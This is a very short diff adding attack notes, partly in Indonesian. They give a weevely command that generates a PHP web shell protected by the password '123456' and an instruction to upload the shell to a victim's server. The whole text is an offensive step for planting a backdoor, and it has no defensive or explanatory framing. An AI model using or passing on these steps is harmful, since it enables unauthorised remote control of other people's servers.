@@ -1,0 +1,5 @@
+weevely generate 123456 /root/shell.php
+
+123456 adalah password
+
+upload shell php ke server korban
